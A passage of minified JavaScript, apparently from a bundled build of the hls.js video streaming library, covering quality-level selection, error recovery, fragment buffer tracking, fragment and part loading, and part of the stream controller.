e=this.hls;e.off(ua.a.MANIFEST_LOADED,this.onManifestLoaded,this),e.off(ua.a.LEVEL_LOADED,this.onLevelLoaded,this),e.off(ua.a.AUDIO_TRACK_SWITCHED,this.onAudioTrackSwitched,this),e.off(ua.a.FRAG_LOADED,this.onFragLoaded,this),e.off(ua.a.ERROR,this.onError,this)},k.destroy=function(){this._unregisterListeners(),this.manualLevelIndex=-1,this._levels.length=0,ta.prototype.destroy.call(this)},k.startLoad=function(){this._levels.forEach((function(e){e.loadError=0})),ta.prototype.startLoad.call(this)},k.onManifestLoaded=function(e,y){var K,ea=[],sa=[],ya=[],Ea={},Ha=!1,Ua=!1,kb=!1;if(y.levels.forEach((function(ub){var gb=ub.attrs;Ha=Ha||!(!ub.width||!ub.height),Ua=Ua||!!ub.videoCodec,kb=kb||!!ub.audioCodec,vb&&ub.audioCodec&&-1!==ub.audioCodec.indexOf("mp4a.40.34")&&(ub.audioCodec=void 0),(K=Ea[ub.bitrate])?K.url.push(ub.url):(K=new Fb(ub),Ea[ub.bitrate]=K,ea.push(K)),gb&&(gb.AUDIO&&r(K,"audio",gb.AUDIO),gb.SUBTITLES&&r(K,"text",gb.SUBTITLES))})),(Ha||Ua)&&kb&&(ea=ea.filter((function(ub){var gb=ub.width,Gb=ub.height;return!!ub.videoCodec||!(!gb||!Gb)}))),ea=ea.filter((function(ub){var gb=ub.audioCodec;return ub=ub.videoCodec,(!gb||u(gb,"audio"))&&(!ub||u(ub,"video"))})),y.audioTracks&&x(sa=y.audioTracks.filter((function(ub){return!ub.audioCodec||u(ub.audioCodec,"audio")}))),y.subtitles&&x(ya=y.subtitles),0<ea.length){e=ea[0].bitrate,ea.sort((function(ub,gb){return ub.bitrate-gb.bitrate})),this._levels=ea;for(var cb=0;cb<ea.length;cb++)if(ea[cb].bitrate===e){this._firstLevel=cb,this.log("manifest loaded, "+ea.length+" level(s) found, first bitrate: "+e);break}y={levels:ea,audioTracks:sa,subtitleTracks:ya,firstLevel:this._firstLevel,stats:y.stats,audio:kb,video:Ua,altAudio:!(kb&&!Ua)&&sa.some((function(ub){return!!ub.url}))},this.hls.trigger(ua.a.MANIFEST_PARSED,y),(this.hls.config.autoStartLoad||this.hls.forceStartLoad)&&this.hls.startLoad(this.hls.config.startPosition)}else this.hls.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.MANIFEST_INCOMPATIBLE_CODECS_ERROR,fatal:!0,url:y.url,reason:"no level with compatible codecs found in manifest"})},k.onError=function(e,y){if(ta.prototype.onError.call(this,e,y),!y.fatal){e=y.context;var K=this._levels[this.currentLevelIndex];if(e&&(e.type===ob.AUDIO_TRACK&&K.audioGroupIds&&e.groupId===K.audioGroupIds[K.urlId]||e.type===ob.SUBTITLE_TRACK&&K.textGroupIds&&e.groupId===K.textGroupIds[K.urlId]))this.redundantFailover(this.currentLevelIndex);else{var ea;K=!1;var sa=!0;switch(y.details){case Ka.a.FRAG_LOAD_ERROR:case Ka.a.FRAG_LOAD_TIMEOUT:case Ka.a.KEY_LOAD_ERROR:case Ka.a.KEY_LOAD_TIMEOUT:y.frag&&((e=this._levels[y.frag.level])?(e.fragmentError++,e.fragmentError>this.hls.config.fragLoadingMaxRetry&&(ea=y.frag.level)):ea=y.frag.level);break;case Ka.a.LEVEL_LOAD_ERROR:case Ka.a.LEVEL_LOAD_TIMEOUT:e&&(e.deliveryDirectives&&(sa=!1),ea=e.level),K=!0;break;case Ka.a.REMUX_ALLOC_ERROR:ea=y.level,K=!0}void 0!==ea&&this.recoverLevel(y,ea,K,sa)}}},k.recoverLevel=function(e,y,K,ea){var sa=e.details,ya=this._levels[y];if(ya.loadError++,K){if(!this.retryLoadingOrFail(e))return void(this.currentLevelIndex=-1);e.levelRetry=!0}ea&&(1<(K=ya.url.length)&&ya.loadError<K?(e.levelRetry=!0,this.redundantFailover(y)):-1===this.manualLevelIndex&&(y=0===y?this._levels.length-1:y-1,this.currentLevelIndex!==y&&0===this._levels[y].loadError&&(this.warn(sa+": switch to "+y),e.levelRetry=!0,this.hls.nextAutoLevel=y)))},k.redundantFailover=function(e){var y=this._levels[e],K=y.url.length;if(1<K){var ea=(y.urlId+1)%K;this.warn("Switching to redundant URL-id "+ea),this._levels.forEach((function(sa){sa.urlId=ea})),this.level=e}},k.onFragLoaded=function(e,y){void 0!==(e=y.frag)&&e.type===lb.MAIN&&void 0!==(e=this._levels[e.level])&&(e.fragmentError=0,e.loadError=0)},k.onLevelLoaded=function(e,y){var K,ea;e=y.level;var sa=y.details,ya=this._levels[e];if(!ya)return this.warn("Invalid level index "+e),void(null!==(ea=y.deliveryDirectives)&&void 0!==ea&&ea.skip&&(sa.deltaUpdateFailed=!0));e===this.currentLevelIndex?(0===ya.fragmentError&&(ya.loadError=0,this.retryCount=0),this.playlistLoaded(e,y,ya.details)):null!==(K=y.deliveryDirectives)&&void 0!==K&&K.skip&&(sa.deltaUpdateFailed=!0)},k.onAudioTrackSwitched=function(e,y){if((e=this.hls.levels[this.currentLevelIndex])&&e.audioGroupIds){var K=-1;y=this.hls.audioTracks[y.id].groupId;for(var ea=0;ea<e.audioGroupIds.length;ea++)if(e.audioGroupIds[ea]===y){K=ea;break}K!==e.urlId&&(e.urlId=K,this.startLoad())}},k.loadPlaylist=function(e){var y=this.currentLevelIndex,K=this._levels[y];if(this.canLoad&&K&&0<K.url.length){var ea=K.urlId;if(K=K.url[ea],e)try{K=e.addDirectives(K)}catch(sa){this.warn("Could not construct new URL with HLS Delivery Directives: "+sa)}this.log("Attempt loading level index "+y+(e?" at sn "+e.msn+" part "+e.part:"")+" with URL-id "+ea+" "+K),this.clearTimer(),this.hls.trigger(ua.a.LEVEL_LOADING,{url:K,level:y,id:ea,deliveryDirectives:e||null})}},k.removeLevel=function(e,y){var K=function(sa,ya){return ya!==y},ea=this._levels.filter((function(sa,ya){return ya!==e||1<sa.url.length&&void 0!==y&&(sa.url=sa.url.filter(K),sa.audioGroupIds&&(sa.audioGroupIds=sa.audioGroupIds.filter(K)),sa.textGroupIds&&(sa.textGroupIds=sa.textGroupIds.filter(K)),sa.urlId=0,!0)})).map((function(sa,ya){var Ea=sa.details;return null!=Ea&&Ea.fragments&&Ea.fragments.forEach((function(Ha){Ha.level=ya})),sa}));this._levels=ea,this.hls.trigger(ua.a.LEVELS_UPDATED,{levels:ea})},n=[{key:"levels",get:function(){return 0===this._levels.length?null:this._levels}},{key:"level",get:function(){return this.currentLevelIndex},set:function(e){var y,K=this._levels;if(0!==K.length&&(this.currentLevelIndex!==e||null===(y=K[e])||void 0===y||!y.details)){if(0>e||e>=K.length){if(y=0>e,this.hls.trigger(ua.a.ERROR,{type:Ka.b.OTHER_ERROR,details:Ka.a.LEVEL_SWITCH_ERROR,level:e,fatal:y,reason:"invalid level idx"}),y)return;e=Math.min(e,K.length-1)}this.clearTimer();var ea=this.currentLevelIndex;y=K[ea],K=K[e],this.log("switching to level "+e+" from "+ea),this.currentLevelIndex=e,delete(e=I({},K,{level:e,maxBitrate:K.maxBitrate,uri:K.uri,urlId:K.urlId}))._urlId,this.hls.trigger(ua.a.LEVEL_SWITCHING,e),(e=K.details)&&!e.live||(e=this.switchParams(K.uri,null==y?void 0:y.details),this.loadPlaylist(e))}}},{key:"manualLevel",get:function(){return this.manualLevelIndex},set:function(e){this.manualLevelIndex=e,void 0===this._startLevel&&(this._startLevel=e),-1!==e&&(this.level=e)}},{key:"firstLevel",get:function(){return this._firstLevel},set:function(e){this._firstLevel=e}},{key:"startLevel",get:function(){if(void 0===this._startLevel){var e=this.hls.config.startLevel;return void 0!==e?e:this._firstLevel}return this._startLevel},set:function(e){this._startLevel=e}},{key:"nextLoadLevel",get:function(){return-1!==this.manualLevelIndex?this.manualLevelIndex:this.hls.nextAutoLevel},set:function(e){this.level=e,-1===this.manualLevelIndex&&(this.hls.nextAutoLevel=e)}}],function L(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ca.prototype,n),ca}(Wb);!function(ta){ta.NOT_LOADED="NOT_LOADED",ta.BACKTRACKED="BACKTRACKED",ta.APPENDING="APPENDING",ta.PARTIAL="PARTIAL",ta.OK="OK"}(Ia||(Ia={}));var jc,wc=function(){function ta(n){this.activeParts=this.activeFragment=null,this.fragments=Object.create(null),this.timeRanges=Object.create(null),this.bufferPadding=.2,this.hls=n,this._registerListeners()}var ca=ta.prototype;return ca._registerListeners=function(){var n=this.hls;n.on(ua.a.BUFFER_APPENDED,this.onBufferAppended,this),n.on(ua.a.FRAG_BUFFERED,this.onFragBuffered,this),n.on(ua.a.FRAG_LOADED,this.onFragLoaded,this)},ca._unregisterListeners=function(){var n=this.hls;n.off(ua.a.BUFFER_APPENDED,this.onBufferAppended,this),n.off(ua.a.FRAG_BUFFERED,this.onFragBuffered,this),n.off(ua.a.FRAG_LOADED,this.onFragLoaded,this)},ca.destroy=function(){this._unregisterListeners(),this.fragments=this.timeRanges=null},ca.getAppendedFrag=function(n,k){if(k===lb.MAIN){var e=this.activeFragment,y=this.activeParts;if(!e)return null;if(y)for(var K=y.length;K--;){var ea=y[K],sa=ea?ea.end:e.appendedPTS;if(ea.start<=n&&void 0!==sa&&n<=sa)return 9<K&&(this.activeParts=y.slice(K-9)),ea}else if(e.start<=n&&void 0!==e.appendedPTS&&n<=e.appendedPTS)return e}return this.getBufferedFrag(n,k)},ca.getBufferedFrag=function(n,k){for(var e=this.fragments,y=Object.keys(e),K=y.length;K--;){var ea=e[y[K]];if((null==ea?void 0:ea.body.type)===k&&ea.buffered&&(ea=ea.body).start<=n&&n<=ea.end)return ea}return null},ca.detectEvictedFragments=function(n,k){var e=this;Object.keys(this.fragments).forEach((function(y){var K=e.fragments[y];K&&K.buffered&&(y=K.range[n])&&y.time.some((function(ea){return(ea=!e.isTimeBuffered(ea.startPTS,ea.endPTS,k))&&e.removeFragment(K.body),ea}))}))},ca.detectPartialFragments=function(n){var k=this,e=this.timeRanges,y=n.frag,K=n.part;if(e&&"initSegment"!==y.sn){n=w(y);var ea=this.fragments[n];ea&&(Object.keys(e).forEach((function(sa){var ya=y.elementaryStreams[sa];ya&&(ea.range[sa]=k.getBufferedTimes(y,K,null!==K||!0===ya.partial,e[sa]))})),ea.backtrack=ea.loaded=null,Object.keys(ea.range).length?ea.buffered=!0:this.removeFragment(ea.body))}},ca.getBufferedTimes=function(n,k,e,y){e={time:[],partial:e};var K=k?k.start:n.start;k=k?k.end:n.end;var ea=n.minEndPTS||k;n=n.maxStartPTS||K;for(var sa=0;sa<y.length;sa++){var ya=y.start(sa)-this.bufferPadding,Ea=y.end(sa)+this.bufferPadding;if(n>=ya&&ea<=Ea){e.time.push({startPTS:Math.max(K,y.start(sa)),endPTS:Math.min(k,y.end(sa))});break}if(K<Ea&&k>ya)e.partial=!0,e.time.push({startPTS:Math.max(K,y.start(sa)),endPTS:Math.min(k,y.end(sa))});else if(k<=ya)break}return e},ca.getPartialFragment=function(n){var k,e,y,K=null,ea=0,sa=this.bufferPadding,ya=this.fragments;return Object.keys(ya).forEach((function(Ea){(Ea=ya[Ea])&&N(Ea)&&(e=Ea.body.start-sa,y=Ea.body.end+sa,n>=e&&n<=y&&(k=Math.min(n-e,y-n),ea<=k&&(K=Ea.body,ea=k)))})),K},ca.getState=function(n){return n=w(n),(n=this.fragments[n])?n.buffered?N(n)?Ia.PARTIAL:Ia.OK:n.backtrack?Ia.BACKTRACKED:Ia.APPENDING:Ia.NOT_LOADED},ca.backtrack=function(n,k){return n=w(n),!(n=this.fragments[n])||n.backtrack?null:(k=n.backtrack=k||n.loaded,n.loaded=null,k)},ca.getBacktrackData=function(n){var k=w(n);if(k=this.fragments[k]){var e;if(null!=(k=k.backtrack)&&null!==(e=k.payload)&&void 0!==e&&e.byteLength)return k;this.removeFragment(n)}return null},ca.isTimeBuffered=function(n,k,e){for(var y,K,ea=0;ea<e.length;ea++){if(y=e.start(ea)-this.bufferPadding,K=e.end(ea)+this.bufferPadding,n>=y&&k<=K)return!0;if(k<=y)break}return!1},ca.onFragLoaded=function(n,k){n=k.frag;var e=k.part;"initSegment"===n.sn||n.bitrateTest||e||(e=w(n),this.fragments[e]={body:n,loaded:k,backtrack:null,buffered:!1,range:Object.create(null)})},ca.onBufferAppended=function(n,k){var e=this,y=k.frag,K=k.part,ea=k.timeRanges;y.type===lb.MAIN&&(this.activeFragment=y,K?((n=this.activeParts)||(this.activeParts=n=[]),n.push(K)):this.activeParts=null),this.timeRanges=ea,Object.keys(ea).forEach((function(sa){var ya=ea[sa];if(e.detectEvictedFragments(sa,ya),!K)for(sa=0;sa<ya.length;sa++)y.appendedPTS=Math.max(ya.end(sa),y.appendedPTS||0)}))},ca.onFragBuffered=function(n,k){this.detectPartialFragments(k)},ca.hasFragment=function(n){return n=w(n),!!this.fragments[n]},ca.removeFragment=function(n){var k=w(n);n.stats.loaded=0,n.clearElementaryStreamInfo(),delete this.fragments[k]},ca.removeAllFragments=function(){this.fragments=Object.create(null),this.activeParts=this.activeFragment=null},ta}(),Lc=function(){function ta(){this._boundTick=void 0,this._tickInterval=this._tickTimer=null,this._tickCallCount=0,this._boundTick=this.tick.bind(this)}var ca=ta.prototype;return ca.destroy=function(){this.onHandlerDestroying(),this.onHandlerDestroyed()},ca.onHandlerDestroying=function(){this.clearNextTick(),this.clearInterval()},ca.onHandlerDestroyed=function(){},ca.hasInterval=function(){return!!this._tickInterval},ca.hasNextTick=function(){return!!this._tickTimer},ca.setInterval=function(n){return!this._tickInterval&&(this._tickInterval=self.setInterval(this._boundTick,n),!0)},ca.clearInterval=function(){return!!this._tickInterval&&(self.clearInterval(this._tickInterval),this._tickInterval=null,!0)},ca.clearNextTick=function(){return!!this._tickTimer&&(self.clearTimeout(this._tickTimer),this._tickTimer=null,!0)},ca.tick=function(){this._tickCallCount++,1===this._tickCallCount&&(this.doTick(),1<this._tickCallCount&&(this.clearNextTick(),this._tickTimer=self.setTimeout(this._boundTick,0)),this._tickCallCount=0)},ca.doTick=function(){},ta}(),Fc={length:0,start:function(){return 0},end:function(){return 0}},dc=function(){function ta(){}return ta.isBuffered=function(ca,n){try{if(ca){var k=ta.getBuffered(ca);for(ca=0;ca<k.length;ca++)if(n>=k.start(ca)&&n<=k.end(ca))return!0}}catch(e){}return!1},ta.bufferInfo=function(ca,n,k){try{if(ca){var e,y=ta.getBuffered(ca);for(ca=[],e=0;e<y.length;e++)ca.push({start:y.start(e),end:y.end(e)});return this.bufferedInfo(ca,n,k)}}catch(K){}return{len:0,start:n,end:n,nextStart:void 0}},ta.bufferedInfo=function(ca,n,k){ca.sort((function(Ha,Ua){return Ha.start-Ua.start||Ua.end-Ha.end}));var e=[];if(k)for(var y=0;y<ca.length;y++){var K=e.length;if(K){var ea=e[K-1].end;ca[y].start-ea<k?ca[y].end>ea&&(e[K-1].end=ca[y].end):e.push(ca[y])}else e.push(ca[y])}else e=ca;for(ca=0,K=y=n,ea=0;ea<e.length;ea++){var sa=e[ea].start,ya=e[ea].end;if(n+k>=sa&&n<ya)y=sa,ca=(K=ya)-n;else if(n+k<sa){var Ea=sa;break}}return{len:ca,start:y||0,end:K||0,nextStart:Ea}},ta.getBuffered=function(ca){try{return ca.buffered}catch(n){return Fa.b.log("failed to get media.buffered",n),Fc}},ta}(),Hc=function(ta,ca,n,k,e,y){void 0===k&&(k=0),void 0===e&&(e=-1),void 0===y&&(y=!1),this.partial=this.size=this.id=this.part=this.sn=this.level=void 0,this.transmuxing={start:0,executeStart:0,executeEnd:0,end:0},this.buffering={audio:{start:0,executeStart:0,executeEnd:0,end:0},video:{start:0,executeStart:0,executeEnd:0,end:0},audiovideo:{start:0,executeStart:0,executeEnd:0,end:0}},this.level=ta,this.sn=ca,this.id=n,this.size=k,this.part=e,this.partial=y},Jb={search:function(ta,ca){for(var e,y,n=0,k=ta.length-1;n<=k;){var K=ca(y=ta[e=(n+k)/2|0]);if(0<K)n=e+1;else{if(!(0>K))return y;k=e-1}}return null}},lc=Math.pow(2,17),qc=function(){function ta(n){this.loader=null,this.partLoadTimeout=-1,this.config=n}var ca=ta.prototype;return ca.destroy=function(){this.loader&&(this.loader.destroy(),this.loader=null)},ca.abort=function(){this.loader&&this.loader.abort()},ca.load=function(n,k){var e=this,y=n.url;if(!y)return Promise.reject(new Dc({type:Ka.b.NETWORK_ERROR,details:Ka.a.FRAG_LOAD_ERROR,fatal:!1,frag:n,networkDetails:null},"Fragment does not have a "+(y?"part list":"url")));this.abort();var K=this.config,ea=K.fLoader,sa=K.loader;return new Promise((function(ya,Ea){e.loader&&e.loader.destroy();var Ha=e.loader=n.loader=ea?new ea(K):new sa(K),Ua=A(n),kb={timeout:K.fragLoadingTimeOut,maxRetry:0,retryDelay:0,maxRetryDelay:K.fragLoadingMaxRetryTimeout,highWaterMark:lc};n.stats=Ha.stats,Ha.load(Ua,kb,{onSuccess:function(cb,ub,gb,Gb){e.resetLoader(n,Ha),ya({frag:n,part:null,payload:cb.data,networkDetails:Gb})},onError:function(cb,ub,gb){e.resetLoader(n,Ha),Ea(new Dc({type:Ka.b.NETWORK_ERROR,details:Ka.a.FRAG_LOAD_ERROR,fatal:!1,frag:n,response:cb,networkDetails:gb}))},onAbort:function(cb,ub,gb){e.resetLoader(n,Ha),Ea(new Dc({type:Ka.b.NETWORK_ERROR,details:Ka.a.INTERNAL_ABORTED,fatal:!1,frag:n,networkDetails:gb}))},onTimeout:function(cb,ub,gb){e.resetLoader(n,Ha),Ea(new Dc({type:Ka.b.NETWORK_ERROR,details:Ka.a.FRAG_LOAD_TIMEOUT,fatal:!1,frag:n,networkDetails:gb}))},onProgress:function(cb,ub,gb,Gb){k&&k({frag:n,part:null,payload:gb,networkDetails:Gb})}})}))},ca.loadPart=function(n,k,e){var y=this;this.abort();var K=this.config,ea=K.fLoader,sa=K.loader;return new Promise((function(ya,Ea){y.loader&&y.loader.destroy();var Ha=y.loader=n.loader=ea?new ea(K):new sa(K),Ua=A(n,k),kb={timeout:K.fragLoadingTimeOut,maxRetry:0,retryDelay:0,maxRetryDelay:K.fragLoadingMaxRetryTimeout,highWaterMark:lc};k.stats=Ha.stats,Ha.load(Ua,kb,{onSuccess:function(cb,ub,gb,Gb){y.resetLoader(n,Ha),y.updateStatsFromPart(n,k),cb={frag:n,part:k,payload:cb.data,networkDetails:Gb},e(cb),ya(cb)},onError:function(cb,ub,gb){y.resetLoader(n,Ha),Ea(new Dc({type:Ka.b.NETWORK_ERROR,details:Ka.a.FRAG_LOAD_ERROR,fatal:!1,frag:n,part:k,response:cb,networkDetails:gb}))},onAbort:function(cb,ub,gb){n.stats.aborted=k.stats.aborted,y.resetLoader(n,Ha),Ea(new Dc({type:Ka.b.NETWORK_ERROR,details:Ka.a.INTERNAL_ABORTED,fatal:!1,frag:n,part:k,networkDetails:gb}))},onTimeout:function(cb,ub,gb){y.resetLoader(n,Ha),Ea(new Dc({type:Ka.b.NETWORK_ERROR,details:Ka.a.FRAG_LOAD_TIMEOUT,fatal:!1,frag:n,part:k,networkDetails:gb}))}})}))},ca.updateStatsFromPart=function(n,k){var e=n.stats,y=k.stats,K=y.total;e.loaded+=y.loaded,K?(n=Math.round(n.duration/k.duration),K=Math.min(Math.round(e.loaded/K),n),e.total=e.loaded+(n-K)*Math.round(e.loaded/K)):e.total=Math.max(e.loaded,e.total),e=e.loading,y=y.loading,e.start?e.first+=y.first-y.start:(e.start=y.start,e.first=y.first),e.end=y.end},ca.resetLoader=function(n,k){n.loader=null,this.loader===k&&(self.clearTimeout(this.partLoadTimeout),this.loader=null),k.destroy()},ta}(),Dc=function(ta){function ca(n){for(var k,e=arguments.length,y=Array(1<e?e-1:0),K=1;K<e;K++)y[K-1]=arguments[K];return(k=ta.call.apply(ta,[this].concat(y))||this).data=void 0,k.data=n,k}return ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,H(ca,ta),ca}(W(Error)),zc=Na(14),Ac_toString=function(ta){for(var ca="",n=ta.length,k=0;k<n;k++)ca+="["+ta.start(k).toFixed(3)+","+ta.end(k).toFixed(3)+"]";return ca},mc=function(ta){function ca(e,y,K){var ea;return(ea=ta.call(this)||this).hls=void 0,ea.fragPrevious=null,ea.fragCurrent=null,ea.fragmentTracker=void 0,ea.transmuxer=null,ea._state="STOPPED",ea.media=void 0,ea.mediaBuffer=void 0,ea.config=void 0,ea.bitrateTest=!1,ea.lastCurrentTime=0,ea.nextLoadPosition=0,ea.startPosition=0,ea.loadedmetadata=!1,ea.fragLoadError=0,ea.retryDate=0,ea.levels=null,ea.fragmentLoader=void 0,ea.levelLastLoaded=null,ea.startFragRequested=!1,ea.decrypter=void 0,ea.initPTS=[],ea.onvseeking=null,ea.onvended=null,ea.logPrefix="",ea.log=void 0,ea.warn=void 0,ea.logPrefix=K,ea.log=Fa.b.log.bind(Fa.b,K+":"),ea.warn=Fa.b.warn.bind(Fa.b,K+":"),ea.hls=e,ea.fragmentLoader=new qc(e.config),ea.fragmentTracker=y,ea.config=e.config,ea.decrypter=new zc.a(e,e.config),e.on(ua.a.KEY_LOADED,ea.onKeyLoaded,function(sa){if(void 0===sa)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return sa}(ea)),ea}ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,Z(ca,ta);var n,k=ca.prototype;return k.doTick=function(){this.onTickEnd()},k.onTickEnd=function(){},k.startLoad=function(e){},k.stopLoad=function(){this.fragmentLoader.abort();var e=this.fragCurrent;e&&this.fragmentTracker.removeFragment(e),this.resetTransmuxer(),this.fragPrevious=this.fragCurrent=null,this.clearInterval(),this.clearNextTick(),this.state="STOPPED"},k._streamEnded=function(e,y){var K=this.fragCurrent,ea=this.fragmentTracker;return!(y.live||!K||K.sn!==y.endSN||e.nextStart||(e=ea.getState(K))!==Ia.PARTIAL&&e!==Ia.OK)},k.onMediaAttached=function(e,y){e=this.media=this.mediaBuffer=y.media,this.onvseeking=this.onMediaSeeking.bind(this),this.onvended=this.onMediaEnded.bind(this),e.addEventListener("seeking",this.onvseeking),e.addEventListener("ended",this.onvended),e=this.config,this.levels&&e.autoStartLoad&&"STOPPED"===this.state&&this.startLoad(e.startPosition)},k.onMediaDetaching=function(){var e=this.media;null!=e&&e.ended&&(this.log("MSE detaching and video ended, reset startPosition"),this.startPosition=this.lastCurrentTime=0),e&&(e.removeEventListener("seeking",this.onvseeking),e.removeEventListener("ended",this.onvended),this.onvseeking=this.onvended=null),this.media=this.mediaBuffer=null,this.loadedmetadata=!1,this.fragmentTracker.removeAllFragments(),this.stopLoad()},k.onMediaSeeking=function(){var e=this.config,y=this.fragCurrent,K=this.media,ea=this.state,sa=K?K.currentTime:0,ya=dc.bufferInfo(this.mediaBuffer||K,sa,e.maxBufferHole);this.log("media seeking to "+(Object($a.a)(sa)?sa.toFixed(3):sa)+", state: "+ea),"ENDED"===ea?this.resetLoadingState():y&&!ya.len&&(e=e.maxFragLookUpTolerance,ea=y.start+y.duration+e,(sa<y.start-e||sa>ea)&&(y.loader&&(this.log("seeking outside of buffer while fragment load in progress, cancel fragment load"),y.loader.abort()),this.resetLoadingState())),K&&(this.lastCurrentTime=sa),this.loadedmetadata||ya.len||(this.nextLoadPosition=this.startPosition=sa),this.tick()},k.onMediaEnded=function(){this.startPosition=this.lastCurrentTime=0},k.onKeyLoaded=function(e,y){"KEY_LOADING"===this.state&&this.levels&&(this.state="IDLE",(e=this.levels[y.frag.level].details)&&this.loadFragment(y.frag,e,y.frag.start))},k.onHandlerDestroying=function(){this.stopLoad(),ta.prototype.onHandlerDestroying.call(this)},k.onHandlerDestroyed=function(){this.state="STOPPED",this.hls.off(ua.a.KEY_LOADED,this.onKeyLoaded,this),this.fragmentLoader&&this.fragmentLoader.destroy(),this.decrypter&&this.decrypter.destroy(),this.hls=this.log=this.warn=this.decrypter=this.fragmentLoader=this.fragmentTracker=null,ta.prototype.onHandlerDestroyed.call(this)},k.loadFragment=function(e,y,K){this._loadFragForPlayback(e,y,K)},k._loadFragForPlayback=function(e,y,K){var ea=this;this._doFragLoad(e,y,K,(function(sa){if(ea.fragContextChanged(e))return ea.warn("Fragment "+e.sn+(sa.part?" p: "+sa.part.index:"")+" of level "+e.level+" was dropped during download."),void ea.fragmentTracker.removeFragment(e);e.stats.chunkCount++,ea._handleFragmentLoadProgress(sa)})).then((function(sa){if(sa){ea.fragLoadError=0;var ya=ea.state;if(!ea.fragContextChanged(e))return"payload"in sa&&(ea.log("Loaded fragment "+e.sn+" of level "+e.level),ea.hls.trigger(ua.a.FRAG_LOADED,sa),"BACKTRACKING"===ea.state)?(ea.fragmentTracker.backtrack(e,sa),void ea.resetFragmentLoading(e)):void ea._handleFragmentLoadComplete(sa);("FRAG_LOADING"===ya||"BACKTRACKING"===ya||!ea.fragCurrent&&"PARSING"===ya)&&(ea.fragmentTracker.removeFragment(e),ea.state="IDLE")}})).catch((function(sa){ea.warn(sa),ea.resetFragmentLoading(e)}))},k.flushMainBuffer=function(e,y,K){void 0===K&&(K=null),e={startOffset:e,endOffset:y,type:K},this.fragLoadError=0,this.hls.trigger(ua.a.BUFFER_FLUSHING,e)},k._loadInitSegment=function(e){var y=this;this._doFragLoad(e).then((function(K){if(!K||y.fragContextChanged(e)||!y.levels)throw Error("init load aborted");return K})).then((function(K){var ea=y.hls,sa=K.payload,ya=e.decryptdata;if(sa&&0<sa.byteLength&&ya&&ya.key&&ya.iv&&"AES-128"===ya.method){var Ea=self.performance.now();return y.decrypter.webCryptoDecrypt(new Uint8Array(sa),ya.key.buffer,ya.iv.buffer).then((function(Ha){var Ua=self.performance.now();return ea.trigger(ua.a.FRAG_DECRYPTED,{frag:e,payload:Ha,stats:{tstart:Ea,tdecrypt:Ua}}),K.payload=Ha,K}))}return K})).then((function(K){var ea=y.fragCurrent,sa=y.hls,ya=y.levels;if(!ya)throw Error("init load aborted, missing levels");ya=ya[e.level].details.initSegment;var Ea=e.stats;y.state="IDLE",y.fragLoadError=0,ya.data=new Uint8Array(K.payload),Ea.parsing.start=Ea.buffering.start=self.performance.now(),Ea.parsing.end=Ea.buffering.end=self.performance.now(),K.frag===ea&&sa.trigger(ua.a.FRAG_BUFFERED,{stats:Ea,frag:ea,part:null,id:e.type}),y.tick()})).catch((function(K){y.warn(K),y.resetFragmentLoading(e)}))},k.fragContextChanged=function(e){var y=this.fragCurrent;return!e||!y||e.level!==y.level||e.sn!==y.sn||e.urlId!==y.urlId},k.fragBufferedComplete=function(e,y){this.log("Buffered "+e.type+" sn: "+e.sn+(y?" part: "+y.index:"")+" of "+("[stream-controller]"===this.logPrefix?"level":"track")+" "+e.level+" "+Ac_toString(dc.getBuffered(this.mediaBuffer?this.mediaBuffer:this.media))),this.state="IDLE",this.tick()},k._handleFragmentLoadComplete=function(e){var y=this.transmuxer;if(y){var K=e.frag,ea=e.part;e=!(e=e.partsLoaded)||0===e.length||e.some((function(sa){return!sa})),K=new Hc(K.level,K.sn,K.stats.chunkCount+1,0,ea?ea.index:-1,!e),y.flush(K)}},k._handleFragmentLoadProgress=function(e){},k._doFragLoad=function(e,y,K,ea){var sa=this;if(void 0===K&&(K=null),!this.levels)throw Error("frag load aborted, missing levels");if(K=Math.max(e.start,K||0),this.config.lowLatencyMode&&y){var ya=y.partList;if(ya&&ea){K>e.end&&y.fragmentHint&&(e=y.fragmentHint);var Ea=this.getNextPart(ya,e,K);if(-1<Ea){var Ha=ya[Ea];return this.log("Loading part sn: "+e.sn+" p: "+Ha.index+" cc: "+e.cc+" of playlist ["+y.startSN+"-"+y.endSN+"] parts [0-"+Ea+"-"+(ya.length-1)+"] "+("[stream-controller]"===this.logPrefix?"level":"track")+": "+e.level+", target: "+parseFloat(K.toFixed(3))),this.nextLoadPosition=Ha.start+Ha.duration,this.state="FRAG_LOADING",this.hls.trigger(ua.a.FRAG_LOADING,{frag:e,part:ya[Ea],targetBufferTime:K}),this.doFragPartsLoad(e,ya,Ea,ea).catch((function(Ua){return sa.handleFragLoadError(Ua)}))}if(!e.url||this.loadedEndOfParts(ya,K))return Promise.resolve(null)}}return this.log("Loading fragment "+e.sn+" cc: "+e.cc+" "+(y?"of ["+y.startSN+"-"+y.endSN+"] ":"")+("[stream-controller]"===this.logPrefix?"level":"track")+": "+e.level+", target: "+parseFloat(K.toFixed(3))),Object($a.a)(e.sn)&&!this.bitrateTest&&(this.nextLoadPosition=e.start+e.duration),this.state="FRAG_LOADING",this.hls.trigger(ua.a.FRAG_LOADING,{frag:e,targetBufferTime:K}),this.fragmentLoader.load(e,ea).catch((function(Ua){return sa.handleFragLoadError(Ua)}))},k.doFragPartsLoad=function(e,y,K,ea){var sa=this;return new Promise((function(ya,Ea){var Ha=[];!function cb(kb){var ub=y[kb];sa.fragmentLoader.loadPart(e,ub,ea).then((function(gb){Ha[ub.index]=gb;var Gb=gb.part;if(sa.hls.trigger(ua.a.FRAG_LOADED,gb),!(gb=y[kb+1])||gb.fragment!==e)return ya({frag:e,part:Gb,partsLoaded:Ha});cb(kb+1)})).catch(Ea)}(K)}))},k.handleFragLoadError=function(e){return(e=e.data)&&e.details===Ka.a.INTERNAL_ABORTED?this.handleFragLoadAborted(e.frag,e.part):this.hls.trigger(ua.a.ERROR,e),null},k._handleTransmuxerFlush=function(e){var y=this.getCurrentContext(e);if(y&&"PARSING"===this.state){var K=y.frag,ea=y.part;y=y.level;var sa=self.performance.now();K.stats.parsing.end=sa,ea&&(ea.stats.parsing.end=sa),this.updateLevelTiming(K,ea,y,e.partial)}else this.fragCurrent||(this.state="IDLE")},k.getCurrentContext=function(e){var 